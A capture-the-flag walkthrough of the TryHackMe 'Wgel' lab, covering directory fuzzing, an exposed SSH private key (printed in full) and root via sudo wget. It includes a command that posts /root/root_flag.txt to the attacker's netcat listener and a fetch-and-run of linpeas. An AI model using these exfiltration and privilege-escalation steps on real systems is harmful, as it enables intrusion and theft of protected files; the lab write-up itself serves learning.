<html><head>
<style>
    body {
        font-family: Arial, sans-serif;
        max-width: 800px;
        margin: 0 auto;
        padding: 20px;
        line-height: 1.6;
        background-color: #f4f4f4;
    }
    h1, h2, h3 {
        color: #333;
        border-bottom: 2px solid #ddd;
        padding-bottom: 10px;
        margin-bottom: 20px;
    }
    p {
        margin-bottom: 20px;
    }
    img {
        max-width: 100%;
        height: auto;
        display: block;
        margin: 0 auto 20px auto;
    }
    code {
        background-color: #f9f9f9;
        border: 1px solid #ccc;
        padding: 5px;
        border-radius: 5px;
    }
    pre {
        background-color: #333;
        color: #f8f8f2;
        padding: 10px;
        border-radius: 5px;
        overflow-x: auto;
    }
</style>
</head><body><p>Greetings folks ! Today I would like to analyze a simple machine called Wgel on TryHackMe platform. Let me start with embedding our ip address to customized domain <code>wgel.th</code> on <code>/etc/hosts</code>.</p>

<p>Follow each command respectively:</p>

<p><code>nano /etc/hosts</code></p>

<p><img src="./images/1.PNG" alt="alt text" /></p>

<p>Test for web application instance:</p>

<p><code>curl -v wgel.thm</code></p>

<p><img src="./images/2.PNG" alt="alt text" /></p>

<p>As you can see above, it seems like a <code>web application</code> running on  port <code>80</code>.</p>

<p>Content of the <code>default web server</code> configuration page can be seen below:</p>

<p><img src="./images/3.PNG" alt="alt text" /></p>

<p>If you already reached through <code>HTTP</code> protocol, no need to force to connect with <code>HTTPS</code> because the developer should activate it as extended feature ,so by default it is normal not to connect.</p>

<p><code>curl -v wgel.thm:443</code></p>

<p><img src="./images/4.PNG" alt="alt text" /></p>

<p>On browser part, we can achieve this request by using through two different ways:</p>

<ul>
<li><p>direct protocol addition
<img src="./images/5.PNG" alt="alt text" /></p></li>
<li><p>adding ending part
<img src="./images/6.PNG" alt="alt text" /></p></li>
</ul>

<p>NOTE: Browsers automatically add the protocol ,so no need to replace <code>:443</code>.</p>

<p><img src="./images/7.PNG" alt="alt text" /></p>

<p>Since we are dealing with web application, let me apply fuzzing:</p>

<h2>Reconnaissance</h2>

<p>First of all, checking <code>robots.txt</code> may reveal useful findings ,but there was not any juicy information about the occurence of the file.</p>

<p><img src="./images/8.PNG" alt="alt text" /></p>

<p>Today I wanted to use <code>GoBuster</code> to get faster results compared to <code>dirb</code> or <code>dirsearch</code>.</p>

<p><strong>Basic Scope</strong></p>

<p><code>gobuster dir -u http://wgel.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</code></p>

<p>Result:
<img src="./images/9.PNG" alt="alt text" /></p>

<p><strong>Medium Scope</strong></p>

<p><code>gobuster dir -u http://wgel.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></p>

<p>Due to the connectivity issues occured in Bilkent Science A building, I was not able to test entire wordlist. The most identical finding can be seen as <code>sitemap</code>.</p>

<p><code>/sitemap              (Status: 301) [Size: 306] [--&gt; http://wgel.thm/sitemap/]</code></p>

<p>There was a clue about something useful in the <code>page source</code>:</p>

<p><img src="./images/15.PNG" alt="alt text" /></p>

<p>It looks like a <code>username</code>. Now, switch on deep-dive fuzzing through <code>/sitemap/</code> directory. </p>

<p><strong>Further Reconnaissance</strong></p>

<p><code>gobuster dir -u http://wgel.thm/sitemap -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</code></p>

<p><img src="./images/10.PNG" alt="alt text" />
Entire endpoints appearing as <code>default</code> so that reaching <code>.ssh</code> part was the most suitable option on that case.</p>

<p><img src="./images/11.PNG" alt="alt text" /></p>

<p>It might be a <code>security misconfiguration</code> since there was not any cases such like in real-world practises :)</p>

<p><code>id_rsa</code> known as private ssh key using for authentication in most SSH sessions. Adversaries who captured such file can connect remote hosts as <code>unauthorized access</code>.</p>

<p>Directly paste the RSA private key with using the command below:</p>

<p><code>echo "-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
" &gt;&gt; id_rsa</code>.</p>

<p>After that try to connect ssh session with the help of the <code>-i</code> parameter in <code>SSH client</code>:</p>

<p><code>ssh -i [id_rsa PATH] [TARGET_IP]</code></p>

<p>then I forgot the permissions for file ,so I assigned <code>777</code> for the file ,but it gave me an error indicating the permissions were too open:</p>

<p><img src="./images/13.PNG" alt="alt text" /></p>

<p>It should be <code>600</code> according to <a href="https://unix.stackexchange.com/questions/257590/ssh-key-permissions-chmod-settings">stackexchange</a>:</p>

<p><img src="./images/14.PNG" alt="alt text" /></p>

<p><code>chmod 600 id_rsa</code> will be enought to assign permissions for the file called <code>id_rsa</code></p>

<p><img src="./images/16.PNG" alt="alt text" />
We are done with recon ! ! !</p>

<p>Reach <code>user flag</code> with one-liner:</p>

<p><code>cd Documents; cat user_flag.txt</code></p>

<h2>Exploitation</h2>

<p>As usual, due to the <code>OSCP</code> preparation, I always use manual way to pass privilege escalation.</p>

<p>Start with <code>sudo -l</code> to understand the commands that the user can run.
<img src="./images/17.PNG" alt="alt text" /></p>

<p>Direct OS enumeration is possible via <code>linpeas</code>:</p>

<p>reach the source file of <a href="https://linpeas.sh/">linpeas</a></p>

<p><img src="./images/18.PNG" alt="alt text" /></p>

<p>Deploy local web server:
<code>python3 -m http.server 1984</code></p>

<p>One-liner to run <code>linpeas</code>:</p>

<p><code>wget http://10.11.69.113:1984/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh</code></p>

<p><img src="./images/19.PNG" alt="alt text" /></p>

<p>I tried 3 commands at once so as to pass each steps and reduce the time after execution of the <code>linpeas</code>.</p>

<p><img src="./images/20.PNG" alt="alt text" />
<img src="./images/21.PNG" alt="alt text" /><img src="./images/22.PNG" alt="alt text" /></p>

<p>We should find a way to download a reverse shell &amp; located on <code>root</code> path &amp; executed.</p>

<p><img src="./images/24.PNG" alt="alt text" /></p>

<p><img src="./images/25.PNG" alt="alt text" /></p>

<p>It did not work because I was not running it on  any <code>privileged</code> paths or somewhere:</p>

<p>After a couple of research I found a useful <a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">resource</a> about <code>wget</code> privilege escalation through <code>POST</code> method:</p>

<p>Observe that the approach is completely similar to mine:</p>

<p><img src="./images/23.PNG" alt="alt text" /></p>

<p>What if I try to capture the <code>root</code> flag instead of <code>shadow</code> and <code>passwd</code> files ? I tried to capture the <code>root.txt</code> file ,but it is frequently located on <code>root</code> path ,so let's try this approach:</p>

<p>To capture <code>POST</code> requests:</p>

<p><code>nc -lvnp 1111</code></p>

<p>Run the command as above:</p>

<p>Since I saw the <code>user flag</code> name as <code>user_flag</code> pattern, I thought that what exactly happens if we  replace the <code>user</code> pattern as <code>root</code> :</p>

<p><code>sudo wget /usr/bin/wget --post-file=/root/root_flag.txt 10.11.69.113</code> </p>

<p>I got it ! ! !</p>

<p>In the first attempt, I did not give specific port the correct way should be likely this:</p>

<p><code>sudo wget /usr/bin/wget --post-file=/root/root_flag.txt 10.11.69.113:1111</code></p>

<p><img src="./images/26.PNG" alt="alt text" /></p>

<p>May The Pentest Be With You  ! ! !</p>

<p><img src="./images/27.jpg" alt="alt text" /></p>
</body></html>